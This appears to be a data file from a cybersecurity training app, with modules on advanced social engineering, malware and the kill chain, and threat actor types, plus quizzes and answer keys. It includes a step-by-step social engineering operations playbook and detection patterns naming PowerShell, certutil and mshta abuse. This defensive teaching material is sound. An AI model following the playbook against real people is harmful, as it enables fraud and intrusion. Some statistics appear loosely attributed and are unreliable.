            what: 'While basic social engineering relies on simple deception, advanced social engineering tactics involve carefully crafted operational tradecraft. Pretexting builds elaborate false identities over weeks. Baiting exploits curiosity with physical or digital lures. Tailgating and piggybacking defeat physical access controls through social compliance. Quid pro quo offers a service or favor in exchange for information. Watering hole attacks compromise websites frequented by the target group. These tactics combine OSINT, psychology, patience, and operational security to defeat even security-aware targets.',
            keyPoints: [
                'Pretexting: building a persistent fake identity with supporting evidence (business cards, LinkedIn profiles, spoofed caller ID, backstory)',
                'Baiting: physical (USB drops in parking lots, labeled "Salary Data") or digital (free software, pirated content with embedded malware)',
                'Tailgating/Piggybacking: bypassing physical security by following authorized personnel, using props (uniforms, boxes, ladders)',
                'Quid Pro Quo: offering technical support, free audits, or favors in exchange for credentials or access ("I\'m from IT, I can fix that if you give me your password")',
                'Watering Hole: compromising a website frequented by the target group to deliver drive-by exploits to visitors'
            ],
            examples: [
                { name: 'Operation Aurora Watering Hole (2009)', detail: 'Attributed to APT17 (China), attackers compromised websites frequented by defense and technology employees, using a zero-day Internet Explorer exploit. Targets included Google, Adobe, Juniper, and 30+ companies.' },
                { name: 'USB Drop Study — University of Illinois (2016)', detail: 'Researchers dropped 297 USB drives across campus. 48% were picked up and plugged into computers, with some users opening files within 6 minutes. Demonstrated that curiosity overwhelms security training.' },
                { name: 'Deepfake CEO Voice Scam (2019)', detail: 'Criminals used AI-generated voice deepfake technology to impersonate a CEO\'s voice on a phone call, convincing a UK energy company executive to wire $243,000 to a fraudulent account. The executive believed he was speaking to his boss.' }
            ],
            stats: [
                { label: 'USB drop success rate', value: '48%', note: 'of dropped USB drives are plugged in (University of Illinois study)' },
                { label: 'Watering hole prevalence', value: '~11%', note: 'of targeted attacks use watering hole technique (Symantec)' },
                { label: 'Deepfake fraud losses', value: '$25M+', note: 'Arup engineering firm deepfake video call scam (2024)' }
            ]
        },
        attackFlow: {
            title: 'Advanced Social Engineering Operation',
            steps: [
                { phase: 'OSINT & Target Profiling', description: 'Deep reconnaissance: LinkedIn for org structure and relationships, social media for personal interests and habits, corporate website for technology stack, FOIA/public records for contracts, dark web for breached credentials. Build a comprehensive target dossier.', icon: '\u{1F50D}' },
                { phase: 'Pretext Construction', description: 'Build a believable identity with supporting evidence: create LinkedIn/social media profiles, register a lookalike domain, obtain business cards and branded materials, set up a spoofed caller ID, and rehearse the backstory to handle unexpected questions.', icon: '\u{1F3AD}' },
                { phase: 'Access Channel Selection', description: 'Choose the optimal attack channel based on the target profile: phone vishing (authority-responsive targets), physical tailgating (poor badge discipline), USB baiting (curious tech workers), watering hole (security-conscious groups who avoid phishing).', icon: '\u{1F4F1}' },
                { phase: 'Trust Establishment', description: 'Initiate contact and build trust over time: initial "warm" contact establishes familiarity, follow-up interactions deepen trust, name-dropping colleagues and referencing real projects builds credibility. May span days or weeks.', icon: '\u{1F91D}' },
                { phase: 'Exploitation Trigger', description: 'Execute the attack when trust is established and conditions are right: request credentials during a "crisis," drop USB drives before a company event, tailgate during a busy entry period, or activate the watering hole exploit when target employees visit the compromised site.', icon: '\u{26A1}' },
                { phase: 'Operational Exit', description: 'Cleanly disengage without raising suspicion: close the pretext scenario naturally, remove or abandon the fake identity, and cover operational traces. The target may never realize they were manipulated.', icon: '\u{1F6B6}' }
            ]
        },
        defense: {
            detection: [
                'Physical security monitoring: cameras and guards at access points watching for tailgating',
                'USB device monitoring: endpoint agents logging all USB device insertions with alerts for unknown devices',
                'Web browsing analysis: detecting when frequented external websites suddenly serve suspicious content (watering hole)',
                'Vishing detection: caller ID verification systems and employee reporting of suspicious calls',
                'Social media monitoring: detecting fake profiles impersonating executives or employees'
            ],
            prevention: [
                'Security awareness training focused on SPECIFIC tactics with realistic simulations (not just generic phishing)',
                'Physical access controls: mantraps (air locks), badge readers requiring individual authentication, anti-tailgating sensors',
                'USB device policies: disable autorun, deploy endpoint DLP that blocks unauthorized USB devices',
                'Web isolation: browse external sites through a cloud-based browser isolation service',
                'Callback verification procedures: always call back on a KNOWN number (never a number provided by the caller)'
            ],
            response: [
                'If pretexting is identified: document the interaction details, alert security team, warn other potential targets',
                'If USB baiting is detected: collect and forensically image the devices, scan all systems that may have been connected',
                'If tailgating occurred: review camera footage, determine what areas were accessed, sweep for planted devices',
                'If a watering hole is discovered: block the compromised URL, scan all employee systems that visited the site recently',
                'Conduct a post-incident awareness brief so the specific tactic becomes recognizable organization-wide'
            ]
        },
        indicators: {
            network: [
                'Newly registered domains mimicking partner or vendor names (pretext infrastructure)',
                'Outbound traffic to recently compromised legitimate websites (watering hole exploitation)',
                'Drive-by download attempts from trusted external sites employees regularly visit',
                'VoIP traffic from spoofed caller IDs matching internal or partner phone numbers',
                'DNS queries for lookalike domains (typosquatting of partners, vendors, or internal domains)'
            ],
            host: [
                'Unknown USB devices being connected to workstations, especially in common areas',
                'Malware execution originating from USB-mounted files or AutoRun',
                'Browser exploitation (drive-by downloads) originating from legitimate but compromised websites',
                'New remote access tools installed after phone-based social engineering calls',
                'Files with enticing names appearing on network shares ("Salary_2026.xlsx", "Layoff_List.pdf")'
            ],
            behavioral: [
                'Employees reporting contact from unfamiliar people who demonstrate unusual knowledge of internal operations',
                'Badge-less individuals in secure areas who cannot be identified by staff',
                'USB drives or other devices found in parking lots, lobbies, or common areas',
                'Unexpected phone calls from "IT support" or "the help desk" requesting credentials or remote access',
                'Employees receiving unsolicited offers for free security audits, software, or technical assistance'
            ],
            tools: ['SET (Social Engineering Toolkit)', 'Gophish (phishing simulation)', 'BeEF (Browser Exploitation Framework)', 'Evilginx2 (advanced phishing proxy)', 'Rubber Ducky (malicious USB)', 'WiFi Pineapple', 'Maltego (OSINT)', 'Vishing simulation platforms', 'Physical pen testing tools (lockpick sets, RFID cloners)', 'Deepfake detection tools (Microsoft Video Authenticator)']
        },
        interactive: {
            scenario: 'Your organization\'s security team finds three USB drives scattered in the employee parking lot on Monday morning. The drives are labeled "Q4 Restructuring — Confidential" with your company\'s logo on a professional sticker. Your parking lot has no cameras. You know from threat intelligence that your industry sector has been targeted by APT groups recently. What do you do?',
            options: [
                'Plug one into an air-gapped analysis machine to see what is on it',
                'Throw them away — someone probably dropped them accidentally',
                'Treat this as a deliberate baiting attack: (1) DO NOT plug the drives into any system including air-gapped machines (BadUSB can attack at the hardware level), (2) send an immediate company-wide alert warning employees about the USB drops, (3) check with physical security for any other dropped devices, (4) send the drives to a forensics lab with proper hardware write-blockers and isolated analysis environments, (5) review endpoint logs for any USB insertions from similar device IDs this morning, (6) report to threat intelligence for attribution against known APT TTPs.',
                'Collect them and give them to IT to scan with antivirus'
            ],
            correct: 2,
            explanation: 'Professional labeling with your company logo means this is almost certainly a targeted baiting attack, not an accident. Key points: (1) Even air-gapped machines are not safe — BadUSB devices can reprogram USB controller firmware to act as keyboards and inject commands regardless of autorun settings. (2) The company-wide alert is critical because employees may have already found and used similar drives. (3) Endpoint logs can reveal if any drives from this batch were already plugged in. (4) Forensic analysis requires proper write-blockers and isolated environments — not just antivirus, which may not detect custom payloads. The APT threat intel context makes this especially urgent — this could be the initial access vector for a targeted campaign.'
        },
        quiz: [
            { question: 'What distinguishes pretexting from basic phishing?', options: ['Pretexting only uses email', 'Pretexting involves building an elaborate, persistent false identity with supporting evidence, often over multiple interactions — while phishing is typically a single deceptive message', 'Pretexting is legal, phishing is not', 'Pretexting is automated, phishing is manual'], correct: 1, explanation: 'Pretexting is high-effort social engineering: the attacker creates a complete fake identity (business cards, LinkedIn profile, spoofed caller ID, rehearsed backstory) and builds trust over multiple interactions. Phishing is usually a single message sent at scale with minimal personalization.' },
            { question: 'In the University of Illinois USB drop study, what percentage of dropped USB drives were plugged into computers?', options: ['5%', '20%', '48% — nearly half of all dropped drives were plugged in, with some opened within 6 minutes', '90%'], correct: 2, explanation: '48% of 297 dropped USB drives were connected to computers, proving that curiosity consistently defeats security training. Some users opened files within 6 minutes of finding the drive — faster than any security response could intervene.' },
            { question: 'What is a watering hole attack?', options: ['Poisoning a company\'s water supply', 'Compromising a website frequently visited by the target group to deliver malware to visitors via drive-by exploits — named after predators who wait at watering holes', 'Flooding a server with traffic', 'Stealing water utility credentials'], correct: 1, explanation: 'Like a predator waiting at a watering hole, attackers compromise websites their targets regularly visit (industry forums, news sites, vendor portals). When employees visit the site, a drive-by exploit silently compromises their systems — bypassing email security entirely.' },
            { question: 'Why are deepfake voice and video attacks particularly dangerous for social engineering?', options: ['They are cheaper than phishing', 'They defeat the primary defense against social engineering — voice and visual verification of identity. When you can\'t trust a phone call or video call to be real, callback verification becomes unreliable.', 'They are faster than email', 'They only affect large companies'], correct: 1, explanation: 'Traditional anti-social-engineering advice says "call back on a known number to verify." But deepfake technology can now replicate a person\'s voice and appearance convincingly enough to fool colleagues. The $25M Arup scam used a deepfake VIDEO CALL with multiple fake participants to authorize a wire transfer.' },
            { question: 'What makes a quid pro quo attack effective?', options: ['It offers something the victim wants (tech support, a favor, a free service) in exchange for information or access — exploiting the reciprocity principle and the victim\'s desire to be helped', 'It uses brute force', 'It requires physical access', 'It only works against IT staff'], correct: 0, explanation: 'Quid pro quo exploits Cialdini\'s reciprocity principle: when someone offers help, people feel obligated to reciprocate. "I\'m from IT support, I can fix your slow computer if you give me your login credentials" is devastatingly effective because the victim genuinely wants the help being offered.' }
        ]
    },

    // =================================================================
    // 27. ATTACKS & MALWARE OVERVIEW
    // =================================================================
    ATTACKS_MALWARE: {
        code: 'ATTACKS_MALWARE',
        title: 'Attacks & Malware Overview',
        icon: '\u{1F6A8}',
        severity: 'critical',
        color: '#ef4444',
        description: 'A comprehensive taxonomy of cyber attacks and malware types — understanding the threat landscape from delivery to impact.',
        overview: {
            what: 'The cyber threat landscape encompasses three distinct but overlapping categories: attacks (the methods adversaries use to compromise systems), malware (the malicious software deployed during or after an attack), and exploits (the specific vulnerabilities leveraged to gain access). Understanding how these categories interrelate is fundamental to cybersecurity defense. Attacks follow predictable lifecycles — from initial reconnaissance through exploitation to achieving objectives — and defenders who understand these stages can disrupt campaigns at multiple points. Malware has evolved from simple viruses that spread via floppy disks in the 1980s to today\'s sophisticated, polymorphic, fileless threats that operate entirely in memory and evade traditional signature-based detection.',
            keyPoints: [
                'The MITRE ATT&CK framework catalogs 14 tactics and 200+ techniques used by real-world adversaries — the industry standard for mapping threats',
                'Malware categories: viruses (self-replicating, need host), worms (self-propagating, no host needed), trojans (disguised as legitimate), ransomware (encryption extortion), spyware (surveillance), rootkits (deep persistence), fileless (memory-only)',
                'Delivery methods: phishing email (90%+ of attacks), drive-by downloads, watering holes, supply chain compromise, USB drops, malvertising, exploitation of public-facing applications',
                'Attacker motivation categories: financial gain (cybercrime), espionage (nation-states), disruption/destruction (hacktivism, warfare), ego/thrill (script kiddies), revenge (insiders)',
                'The Cyber Kill Chain (Lockheed Martin) maps 7 sequential phases — breaking any one link disrupts the entire attack',
                'Modern malware increasingly uses living-off-the-land (LOLBins) techniques, abusing legitimate system tools like PowerShell, WMI, and certutil to avoid detection'
            ],
            examples: [
                { name: 'WannaCry Ransomware (2017)', detail: 'Exploited EternalBlue (MS17-010 SMB vulnerability leaked from NSA by Shadow Brokers) to self-propagate as a worm across networks. Infected 230,000+ computers in 150 countries in 24 hours. Estimated $4-8 billion in damages. NHS hospitals forced to divert ambulances. A $10 domain registration by researcher Marcus Hutchins accidentally activated the kill switch.' },
                { name: 'Stuxnet (2010)', detail: 'The first known cyberweapon — a nation-state worm (attributed to US/Israel Operation Olympic Games) targeting Iranian uranium enrichment centrifuges. Used 4 zero-day exploits, spread via USB, and contained PLC-specific payloads that altered centrifuge spin speeds while reporting normal readings to operators. Destroyed ~1,000 centrifuges and set Iran\'s nuclear program back 2+ years.' },
                { name: 'SolarWinds SUNBURST (2020)', detail: 'APT29 compromised SolarWinds\' Orion build pipeline, injecting a backdoor (SUNBURST) into legitimate software updates. 18,000+ organizations downloaded the trojanized update, including U.S. Treasury, Commerce, DHS, and Fortune 500 companies. Attackers had access for 9+ months before detection by FireEye.' }
            ],
            stats: [
                { label: 'New malware per day', value: '450,000+', note: 'AV-TEST Institute 2024 — 1B+ total known malware samples' },
                { label: 'Avg. ransomware payment', value: '$1.54M', note: 'Sophos State of Ransomware 2024 (2x increase from 2023)' },
                { label: 'Attacks via phishing', value: '91%', note: 'of successful cyber attacks start with a phishing email (PhishMe/Cofense)' },
                { label: 'Avg. breach detection', value: '204 days', note: 'IBM Cost of a Data Breach 2024 — down from 277 days in 2022' }
            ]
        },
        attackFlow: {
            title: 'Cyber Kill Chain — Attack Lifecycle',
            steps: [
                { phase: 'Reconnaissance', description: 'Attacker gathers intelligence on the target: OSINT from social media, DNS records, job postings revealing tech stack, Shodan/Censys for exposed services, LinkedIn for employee roles and org structure. Both passive (no direct contact) and active (port scanning, vulnerability scanning) reconnaissance.', icon: '\u{1F50D}' },
                { phase: 'Weaponization', description: 'Attacker couples a remote access trojan (RAT) with an exploit into a deliverable payload. This might be a weaponized Office document with a macro dropper, a trojanized PDF exploiting a reader vulnerability, or a custom implant compiled for the target\'s specific OS and architecture. The payload is tested against common AV engines.', icon: '\u{2692}' },
                { phase: 'Delivery', description: 'The weaponized payload is transmitted to the target via phishing emails (spear phishing for high-value targets), compromised websites (watering holes), malicious advertisements (malvertising), supply chain injection, or physical media (USB drops). The delivery method is chosen based on reconnaissance findings.', icon: '\u{1F4E8}' },
                { phase: 'Exploitation', description: 'The weapon triggers and exploits a vulnerability: a user opens a macro-enabled document, clicks a malicious link, or a server-side vulnerability is triggered. This could be a known CVE with a public exploit, a zero-day, or simply social engineering that convinces the user to execute malicious code willingly.', icon: '\u{1F4A5}' },
                { phase: 'Installation', description: 'Malware installs itself and establishes persistence: registry run keys, scheduled tasks, DLL hijacking, WMI event subscriptions, bootkit installation, or service creation. Modern malware often uses fileless techniques, living entirely in memory or abusing legitimate system processes (LOLBins).', icon: '\u{1F4E5}' },
                { phase: 'Command & Control (C2)', description: 'The implant establishes communication with attacker infrastructure: HTTPS beaconing to cloud-fronted domains, DNS tunneling, social media dead drops, or traffic hidden in legitimate protocols. C2 provides the attacker with an interactive session to issue commands, upload additional tools, and pivot deeper into the network.', icon: '\u{1F4E1}' },
                { phase: 'Actions on Objectives', description: 'The attacker achieves their goal: data exfiltration (intellectual property, PII, credentials), ransomware deployment and encryption, destructive attacks (wipers like NotPetya), cryptocurrency mining, establishing persistent backdoors for future campaigns, or using the compromised network as a launchpad for attacks on other targets.', icon: '\u{1F3AF}' }
            ]
        },
        defense: {
            detection: [
                'Endpoint Detection and Response (EDR): behavioral analysis detects malicious process chains, fileless execution, and LOLBin abuse — not just signature matching',
                'Network Detection and Response (NDR): deep packet inspection, TLS interception, and flow analysis to identify C2 beaconing, data exfiltration, and lateral movement',
                'Sandboxing and dynamic analysis: detonate suspicious files and URLs in isolated environments to observe behavior before they reach endpoints',
                'SIEM with threat intelligence correlation: aggregate logs from all sources and match against known IOCs, TTPs, and MITRE ATT&CK patterns',
                'Deception technology (honeypots, honeytokens): deploy fake credentials, files, and services that legitimate users would never access — any interaction is an immediate high-fidelity alert'
            ],
            prevention: [
                'Patch management program: automated patching within 24-72 hours for critical CVEs — unpatched vulnerabilities are the #1 initial access vector after phishing',
                'Application whitelisting: only pre-approved executables can run — blocks unknown malware, LOLBin abuse, and unauthorized software regardless of AV signatures',
                'Email security gateway with URL rewriting, attachment sandboxing, and DMARC/DKIM/SPF enforcement to block phishing delivery',
                'Network segmentation and microsegmentation: limit blast radius by isolating critical systems, enforcing least-privilege network access between zones',
                'Security awareness training with simulated phishing campaigns: the human is the first and last line of defense for social engineering delivery methods'
            ],
            response: [
                'Containment: isolate affected systems from the network immediately (EDR network quarantine, switch port shutdown, or firewall rules) while preserving forensic evidence',
                'Eradication: identify all persistence mechanisms, remove malware artifacts, and close the initial access vector. Rebuild from known-good images if rootkit or bootkit is suspected',
                'Recovery: restore systems from verified clean backups, rotate all credentials (especially service accounts and domain admin), and validate integrity of critical data',
                'Forensic analysis: timeline reconstruction, malware reverse engineering, IOC extraction for detection rule updates, and root cause analysis to prevent recurrence',
                'Post-incident: update detection rules, share IOCs with ISACs and threat intelligence platforms, conduct lessons-learned review, and update incident response playbooks'
            ]
        },
        indicators: {
            network: [
                'Beaconing traffic: periodic outbound connections at regular intervals (e.g., every 60 seconds) to domains with low reputation scores or recent registration',
                'Unusual DNS activity: high volume of TXT or NULL record queries (DNS tunneling), queries to algorithmically generated domains (DGA), or DNS over HTTPS to non-corporate resolvers',
                'Anomalous data flows: large outbound transfers to unusual geographic regions, data exfiltration via ICMP, DNS, or steganography in image uploads',
                'Lateral movement signatures: SMB/RPC traffic between workstations (not normal), mass authentication attempts, or PsExec/WMI remote execution patterns',
                'C2 infrastructure indicators: connections to known-bad IPs/domains from threat intel feeds, TLS certificates with suspicious attributes, or traffic to cloud services used as C2 redirectors'
            ],
            host: [
                'New persistence mechanisms: unexpected scheduled tasks, services, registry autorun keys, WMI subscriptions, or startup folder entries',
                'Suspicious process behavior: PowerShell with encoded commands (-EncodedCommand), cmd.exe spawned from Office applications, certutil used for file downloads, or mshta executing remote scripts',
                'File system anomalies: executables in temp directories or user profile folders, files with double extensions (invoice.pdf.exe), or modification of system binaries (DLL hijacking)',
                'Memory-only indicators: reflective DLL injection, process hollowing (legitimate process replaced with malicious code), or suspicious thread injection into system processes',
                'Anti-forensic activity: cleared event logs, disabled Windows Defender or AMSI, timestomped files, or deleted prefetch/shimcache entries'
            ],
            behavioral: [
                'Unusual user activity: accounts active during non-business hours, accessing resources outside their normal pattern, or authenticating from new geographic locations',
                'Privilege escalation indicators: normal users suddenly accessing admin shares, service accounts used interactively, or new local admin accounts created',
                'Data staging behavior: large amounts of data copied to a single staging directory before exfiltration, files compressed or encrypted before transfer',
                'Reconnaissance patterns: internal port scanning, Active Directory enumeration (BloodHound, SharpHound), or mass DNS lookups of internal hostnames',
                'Defense evasion: security tools disabled or uninstalled, audit policies modified, or exclusions added to antivirus configurations'
            ],
            tools: ['MITRE ATT&CK Navigator', 'VirusTotal', 'Cuckoo Sandbox', 'YARA', 'Snort/Suricata', 'Elastic Security', 'Splunk Enterprise Security', 'CrowdStrike Falcon', 'Any.Run', 'Joe Sandbox']
        },
        interactive: {
            scenario: 'A user in your accounting department reports that after opening an email attachment labeled "Q4_Invoice.xlsm" from an unknown sender, their computer briefly showed a command prompt window flash and then nothing happened. Your EDR console shows the following chain: OUTLOOK.EXE spawned EXCEL.EXE, which spawned CMD.EXE, which spawned POWERSHELL.EXE with a Base64-encoded command. The PowerShell process made an outbound HTTPS connection to a domain registered 3 days ago. What kill chain phase has been reached, and what is your response?',
            options: [
                'This is normal Office macro behavior — no action needed',
                'The attack has reached the C2 phase. EXCEL.EXE spawning CMD.EXE spawning POWERSHELL.EXE is a classic malicious macro execution chain. The encoded PowerShell reaching out to a newly registered domain confirms a C2 implant was downloaded. Immediately: (1) isolate the endpoint via EDR, (2) block the C2 domain at the firewall and DNS, (3) pull the Base64 command for decoding and IOC extraction, (4) search all endpoints for the same parent-child process chain, (5) quarantine the email and search for other recipients, (6) preserve memory dump before reboot.',
                'The attack stopped at the Delivery phase since the user reported it — just delete the email',
                'Run a full antivirus scan on the machine and wait for results before taking action'
            ],
            correct: 1,
            explanation: 'The process chain OUTLOOK→EXCEL→CMD→POWERSHELL with encoded commands and outbound C2 is textbook kill chain progression through Delivery (email), Exploitation (macro execution), Installation (PowerShell payload), and into C2 (beacon to new domain). The attack has already progressed past installation. Waiting for an AV scan wastes critical time — the attacker may already be issuing commands. Immediate EDR isolation stops lateral movement while preserving the system state for forensics. The "nothing happened" user report is actually the worst sign — it means the payload executed cleanly without crashing.'
        },
        quiz: [
            { question: 'What is the fundamental difference between a virus and a worm?', options: ['Viruses are more dangerous than worms', 'A virus requires a host file to propagate and needs user action to spread, while a worm self-propagates across networks without any host file or user interaction', 'Worms only affect Linux systems', 'Viruses are newer than worms'], correct: 1, explanation: 'A virus attaches to a legitimate file (the host) and requires user action (opening the file, running the program) to spread. A worm is a standalone program that self-propagates by exploiting network vulnerabilities — WannaCry exploited SMB to spread to 230,000 systems without any user clicks.' },
            { question: 'In the Lockheed Martin Cyber Kill Chain, what phase comes immediately after Exploitation?', options: ['Delivery', 'Command & Control', 'Installation', 'Reconnaissance'], correct: 2, explanation: 'The Kill Chain order is: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives. After exploitation triggers the vulnerability, the attacker installs persistence mechanisms (backdoors, RATs, scheduled tasks) to maintain access.' },
            { question: 'Why is "living off the land" (LOLBins) particularly challenging for defenders?', options: ['Because LOLBins are encrypted', 'Because attackers abuse legitimate, pre-installed system tools (PowerShell, WMI, certutil) that cannot be blocked without breaking normal operations — making malicious use indistinguishable from admin activity', 'Because LOLBins only work on Linux', 'Because LOLBins bypass firewalls'], correct: 1, explanation: 'LOLBins (Living Off the Land Binaries) are legitimate system administration tools. PowerShell is used by IT daily — you cannot simply block it. When an attacker uses PowerShell to download a payload or certutil to decode a base64-encoded binary, the activity looks identical to legitimate admin work. Detection requires behavioral context, not signatures.' },
            { question: 'What made the SolarWinds SUNBURST attack so devastating compared to typical malware delivery?', options: ['It used a zero-day exploit', 'The malware was delivered through a legitimate, digitally signed software update from a trusted vendor — bypassing all traditional security controls because organizations inherently trust their supply chain', 'It targeted more computers', 'It used stronger encryption'], correct: 1, explanation: 'Supply chain attacks weaponize trust. SolarWinds Orion was a trusted network management tool, digitally signed by SolarWinds, and distributed through their official update channel. No phishing, no exploitation — organizations voluntarily installed the backdoor because it came from a trusted source through a trusted process.' },
            { question: 'What percentage of successful cyber attacks begin with a phishing email?', options: ['About 25%', 'About 50%', 'Over 90% — making email the dominant initial access vector by a wide margin', 'About 75%'], correct: 2, explanation: 'Multiple studies consistently show that 90%+ of successful attacks start with phishing. Despite billions spent on technical security controls, the human element remains the most exploitable vulnerability. This is why email security and security awareness training are considered foundational controls.' },
            { question: 'Which malware type operates entirely in memory without writing files to disk?', options: ['Ransomware', 'Fileless malware — it uses techniques like reflective DLL injection, PowerShell in-memory execution, and process hollowing to avoid leaving artifacts on disk', 'Adware', 'Boot sector virus'], correct: 1, explanation: 'Fileless malware never touches the filesystem, operating entirely in RAM through techniques like reflective DLL injection (loading a DLL from memory, not disk), process hollowing (replacing a legitimate process\'s memory), or PowerShell executing downloaded scripts directly in memory. This evades traditional AV that scans files on disk — detection requires memory analysis and behavioral monitoring.' }
        ]
    },

    // =================================================================
    // 28. THREAT ACTOR TAXONOMY
    // =================================================================
    THREAT_ACTORS: {
        code: 'THREAT_ACTORS',
        title: 'Threat Actor Taxonomy',
        icon: '\u{1F3AD}',
        severity: 'high',
        color: '#f59e0b',
        description: 'Classification of cyber threat actors by motivation, capability, and sophistication — from script kiddies to nation-state APT groups.',
        overview: {
            what: 'A threat actor is any individual, group, or organization that intentionally causes harm in the digital domain. Threat actors range from lone teenagers running automated scripts to nation-state intelligence agencies with unlimited budgets and zero-day stockpiles. Understanding threat actor taxonomy is essential for threat modeling — you cannot defend against an adversary you do not understand. Attribution (determining who is behind an attack) is one of the hardest problems in cybersecurity because sophisticated actors deliberately use false flags, shared tooling, and compromised infrastructure to obscure their identity. The Diamond Model of Intrusion Analysis maps the relationship between adversary, capability, infrastructure, and victim to guide attribution efforts.',
            keyPoints: [
                'Nation-state actors (APT groups): government-backed, unlimited resources, strategic objectives (espionage, sabotage, pre-positioning). Examples: APT28/29 (Russia), APT41 (China), Lazarus (North Korea), APT33 (Iran)',
                'Organized cybercrime: profit-driven syndicates operating ransomware-as-a-service (RaaS), business email compromise (BEC), and large-scale fraud. Revenue estimated at $8+ trillion annually by 2025 (Cybersecurity Ventures)',
                'Hacktivists: ideologically motivated actors using DDoS, defacement, data leaks, and doxxing for political or social causes. Operations range from nuisance-level to genuinely damaging data exposure',
                'Insider threats: current or former employees, contractors, or partners who misuse authorized access. Can be malicious (revenge, financial gain) or negligent (accidental data exposure). Responsible for ~25% of breaches',
                'Script kiddies: low-skill actors using pre-built tools and exploit kits without understanding the underlying techniques. Despite low sophistication, they cause real damage through volume and automated scanning',
                'Capability spectrum: ranges from publicly available exploit kits (script kiddies) through custom malware and zero-day exploits (organized crime, nation-states) to hardware implants and supply chain compromise (top-tier nation-states)'
            ],
            examples: [
                { name: 'Lazarus Group (North Korea)', detail: 'Bureau 121-linked APT responsible for the Sony Pictures hack (2014 — retaliation for "The Interview"), WannaCry ransomware (2017 — $4B+ damage), Bangladesh Bank SWIFT heist ($81M stolen, $1B attempted), and ongoing cryptocurrency theft operations ($2B+ stolen since 2017). Unique among APTs: combines espionage with revenue generation to fund the DPRK regime.' },
                { name: 'Anonymous (Hacktivist Collective)', detail: 'Decentralized hacktivist collective known for DDoS campaigns, data leaks, and website defacements. Notable operations: Project Chanology (2008, Scientology), OpPayback (2010, WikiLeaks supporters DDoS\'d PayPal/Visa), support for Arab Spring, and operations against Russia during the 2022 Ukraine invasion. Demonstrates how loose, leaderless groups can achieve significant impact through coordination.' },
                { name: 'Lapsus$ (Teenage Extortion Group)', detail: 'A group of teenagers (ages 16-21) who breached Microsoft (Bing/Cortana source code), Nvidia (employee credentials + proprietary data), Samsung (Galaxy source code), Okta (identity provider — impacted 366 customers), and Uber. Used social engineering, SIM swapping, and MFA fatigue rather than sophisticated exploits — proving that human-factor attacks bypass even the most advanced technical defenses.' }
            ],
            stats: [
                { label: 'Insider threat incidents', value: '~25%', note: 'of all breaches involve internal actors (Verizon DBIR 2024)' },
                { label: 'Nation-state attack cost', value: '$4.88M avg', note: 'IBM Cost of a Data Breach 2024 — highest when state-sponsored' },
                { label: 'Cybercrime revenue', value: '$8T/year', note: 'Cybersecurity Ventures 2024 — would be world\'s 3rd largest economy' },
                { label: 'Attribution confidence', value: '<50%', note: 'Only ~50% of attacks can be attributed with high confidence (RAND Corporation)' }
            ]
        },
        attackFlow: {
            title: 'Threat Actor Campaign Lifecycle',
            steps: [
                { phase: 'Actor Identification', description: 'Threat intelligence teams classify the adversary based on observed TTPs (Tactics, Techniques, and Procedures), infrastructure patterns, malware families, and targeting preferences. MITRE ATT&CK groups catalog provides profiles of 130+ known threat groups with associated techniques and software.', icon: '\u{1F50D}' },
                { phase: 'Capability Assessment', description: 'Evaluate the actor\'s technical sophistication: do they use commodity malware (low), custom tooling (medium), or zero-day exploits and firmware implants (high)? Assess operational security — do they reuse infrastructure (sloppy) or use disposable, compartmentalized operations (sophisticated)? Resource estimation: nation-states have virtually unlimited budgets; script kiddies have $0.', icon: '\u{1F4CA}' },
                { phase: 'Intent Analysis', description: 'Determine the actor\'s motivation: espionage (data theft for strategic advantage), financial (ransomware, fraud, crypto theft), destructive (wipers, sabotage), ideological (hacktivism, information operations), or personal (insider revenge, thrill-seeking). Motivation shapes targeting and acceptable risk — a nation-state will invest months for one target; a criminal will attack thousands hoping for one payout.', icon: '\u{1F9E0}' },
                { phase: 'Target Selection', description: 'Actors choose targets based on opportunity, value, and alignment with objectives. Nation-states target defense, government, energy, and critical infrastructure. Organized crime targets organizations with valuable data and weak security. Hacktivists target organizations opposed to their ideology. Insiders already have access to their target. Target selection reveals actor identity.', icon: '\u{1F3AF}' },
                { phase: 'Campaign Execution', description: 'The actor deploys their capabilities against chosen targets using their preferred TTPs: spear phishing and custom implants (nation-state), phishing kits and ransomware-as-a-service (cybercrime), DDoS and defacement tools (hacktivists), or credential abuse and data download (insiders). Campaigns may be single operations or sustained over months/years.', icon: '\u{26A1}' },
                { phase: 'Attribution Challenges', description: 'Determining who conducted an attack is extremely difficult. Sophisticated actors use false flags (planting another group\'s malware), shared tooling (open-source tools used by everyone), compromised third-party infrastructure (attacks appear to come from an innocent organization), and operational security that destroys forensic evidence. Attribution often requires signals intelligence, human intelligence, or law enforcement cooperation — not just technical analysis.', icon: '\u{2753}' }
            ]
        },
        defense: {
            detection: [
                'Threat intelligence feeds: subscribe to commercial (Recorded Future, Mandiant) and open-source (AlienVault OTX, MISP) feeds that track known threat actor infrastructure, malware hashes, and behavioral patterns',
                'Behavioral analytics (UEBA): baseline normal user and entity behavior, then alert on deviations — detects both external actors using stolen credentials and malicious insiders changing their access patterns',
                'TTP-based detection rules: map detection logic to MITRE ATT&CK techniques rather than IOCs (which change frequently). Detect the behavior pattern, not the specific tool or IP address',
                'Dark web monitoring: track threat actor forums, ransomware leak sites, and initial access broker marketplaces for mentions of your organization, stolen credentials, or planned targeting',
                'Honeypots and deception: deploy realistic decoy systems, credentials, and data that no legitimate user would access. Any interaction reveals an attacker\'s presence, tools, and techniques — high fidelity, low false positive'
            ],
            prevention: [
                'Threat modeling: identify which threat actors are likely to target your organization (industry, geography, data value) and prioritize defenses against their known TTPs — you cannot defend equally against everything',
                'Security awareness training: Lapsus$ proved that social engineering and MFA fatigue bypass even advanced technical controls. Train employees to recognize pretexting, SIM swap requests, and MFA prompt bombing',
                'Insider threat program: implement least-privilege access, separation of duties, user activity monitoring, and departure procedures. Combine technical controls with HR processes for behavioral warning signs',
                'Defense-in-depth aligned to actor capability: commodity threats stopped by basic hygiene (patching, MFA, email filtering); advanced actors require EDR, network segmentation, zero trust, and threat hunting',
                'Intelligence-driven patching: prioritize vulnerabilities known to be exploited by threat actors targeting your sector (CISA KEV catalog, sector-specific ISACs) over generic CVSS scoring'
            ],
            response: [
                'Attribution-informed response: the response to a nation-state intrusion differs fundamentally from a ransomware gang. Nation-state: coordinate with intelligence agencies, assume the adversary will return, and plan for long-term remediation. Ransomware: focus on containment, backup restoration, and law enforcement reporting',
                'Law enforcement coordination: FBI (IC3, field offices), Secret Service (financial crimes), CISA (critical infrastructure), and international coordination via Interpol. Share IOCs and TTPs to support broader disruption efforts',
